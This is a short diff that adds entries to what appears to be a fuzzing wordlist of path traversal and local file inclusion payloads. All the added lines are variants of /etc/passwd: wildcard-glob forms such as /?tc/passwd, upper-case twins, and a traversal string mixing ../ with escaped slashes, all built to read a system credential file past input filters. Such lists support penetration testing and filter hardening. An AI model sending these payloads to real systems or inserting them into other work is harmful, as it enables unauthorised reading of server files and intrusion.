@@ -5,6 +5,24 @@ passwd
 PASSWD
 /etc/passwd
 /ETC/PASSWD
+/?tc/passwd
+/?TC/PASSWD
+/e?c/passwd
+/E?C/PASSWD
+/et?/passwd
+/ET?/PASSWD
+/etc/?asswd
+/ETC/?ASSWD
+/etc/p?sswd
+/ETC/P?SSWD
+/etc/pa?swd
+/ETC/PA?SWD
+/etc/pas?wd
+/ETC/PAS?WD
+/etc/pass?d
+/ETC/PASS?D
+/etc/passw?
+/ETC/PASSW?
 "/etc/passwd"
 "/ETC/PASSWD"
 '/etc/passwd'
@@ -52,6 +70,9 @@ _ /ETC/PASSWD
 \…..\\\…..\\\…..\\\ETC\\PASSWD
 /…..///…..///…..///etc//passwd
 /…..///…..///…..///ETC//PASSWD
+../../../..\/etc\/passwd
+../../../..\/ETC\/PASSWD
+
 ```
 
 
